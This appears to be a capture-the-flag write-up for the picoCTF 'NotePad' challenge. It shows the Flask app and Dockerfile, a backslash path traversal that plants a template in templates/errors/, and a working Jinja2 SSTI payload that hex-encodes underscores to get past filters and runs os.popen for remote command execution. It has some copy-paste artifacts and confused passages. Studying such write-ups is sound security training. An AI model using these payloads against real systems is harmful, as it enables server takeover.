# NotePad



### Description

> This note-taking site seems a bit off.

The application sources were attached:

`app.py`:

```python
from werkzeug.urls import url_fix
from secrets import token_urlsafe
from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html", error=request.args.get("error"))

@app.route("/new", methods=["POST"])
def create():
    content = request.form.get("content", "")
    if "_" in content or "/" in content:
        return redirect(url_for("index", error="bad_content"))
    if len(content) > 512:
        return redirect(url_for("index", error="long_content", len=len(content)))
    name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
    with open(name, "w") as f:
        f.write(content)
    return redirect(name)

```

`Dockerfile`:

```
FROM python:3.9.2-slim-buster

RUN pip install flask gunicorn --no-cache-dir

WORKDIR /app
COPY app.py flag.txt ./
COPY templates templates
RUN mkdir /app/static && \
    chmod -R 775 . && \
    chmod 1773 static templates/errors && \
    mv flag.txt flag-$(cat /proc/sys/kernel/random/uuid).txt

CMD ["gunicorn", "-w16", "-t5", "--graceful-timeout", "0", "-unobody", "-gnogroup", "-b0.0.0.0", "app:app"]

```

`templates/index.html`:

```html
<!doctype html>

<div data-gb-custom-block data-tag="if">
  <h3>
    error: {{ error }}
  </h3>
  <div data-gb-custom-block data-tag="include" data-0='errors/' data-1='.html' data-2='.html'></div>



</div>


<h2>make a new note</h2>
<form action="/new" method="POST">
  <textarea name="content"></textarea>
  <input type="submit">
</form>
```

`templates/errors/bad_content.html`:

```html
the note contained invalid characters
```

`templates/errors/long_content.html`:

```html
your note (length {{ request.args.get("len") }}) was larger than the maximum (512)
```

#### Exploitation Steps

Upon visiting the website, we find a note-taking application. When we post a note, the content is saved to a file on the server, and we can access it through a generated URL. For instance, if we post the note `test`, we are redirected to a URL such as:\
`https://notepad.mars.picoctf.net/static/test-gDpEQjbSwSQ.html`

The URL structure is composed of:

1. The first 128 characters of the note (`test` in this case).
2. A hyphen (`-`).
3. A random string generated with `token_urlsafe(8)`.
4. The file extension `.html`.

The server saves this file in the `static/` directory, as seen in the code:

```python
pythonCopierModifierf"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
```

This means we control the file name and path to some extent, particularly the directory where the file is saved, because the first 128 characters of the note are under our control.

**Directory Traversal**

If we include a slash (`/`) in the note, it enables directory traversal, allowing us to write files outside the `static/` folder. For example, entering `../templates/errors/custom-error` in the note could create a file in the `templates/errors/` directory.

**Vulnerability in Error Handling**

The application’s error-handling mechanism calls error templates from the `templates/errors/` directory. It renders error messages without properly sanitizing or escaping the content:

```python
pythonCopierModifierreturn render_template("index.html", error=request.args.get("error"))
```

This is where the vulnerability lies. By adding an `error` parameter in the URL, such as `?error=bad_content`, we can trigger the rendering of the error message. For example:\
`https://notepad.mars.picoctf.net/?error=bad_content`

The `error` value is directly passed into the template as:

```html
htmlCopierModifier{{ error }}
```

**Testing for SSTI**

To verify if the application is vulnerable to Server-Side Template Injection (SSTI), we can create a custom error page with content like `{{7*7}}` and point the error handler to it. This content will be evaluated if SSTI is present.

Here are the steps:

1. Use the note feature to create a file in the `templates/errors/` directory by entering a payload like `../templates/errors/custom-error` in the first 128 characters of the note.
2.  Save the note with content:

    ```jinja2
    {{7*7}}
    ```
3. Trigger the custom error by visiting the URL:\
   `https://notepad.mars.picoctf.net/?error=custom-error`
4. If SSTI is exploitable, the output will display `49`, confirming the vulnerability.

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

As we can see the bad\_content error has been called from /templates/erros/bad\_content.html via the error get request .

lets try making " ..\templates\errors\test" as content  :smile:

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Than we can call our created file by the ?error=test-kEKNHqhOtqQ

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Nice :clap: the url path where the test has been created is templates/errors/ , it worked :smile: , but the content will be url fixed :&#x20;

```
  name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
```

We can use `{{7*7}}` within the first 128 characters because it will be URL-encoded.

we have to input the ..\templates\errors\\+128 letter + \{{7\*7\}} .

Lets try this as input :&#x20;

<mark style="color:orange;">..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\{{7\*7\}}</mark>

Url resulted : [https://notepad.mars.picoctf.net/templates/errors/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-GutGiYjjrN0.html](https://notepad.mars.picoctf.net/templates/errors/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-GutGiYjjrN0.html)

than we have to call our page with the error like we did before :&#x20;

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Boom :tada: the SSTI worked and we got 49 :) .

Now using some google we will find the RCE payload needed to read the flag using SSTI.

### <mark style="color:orange;">Found an incredible command that successfully bypasses SSTI common filters:</mark>

```hsts
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')() }}

```

```python
..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAA{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')() }}
```

Enjoy :smile:

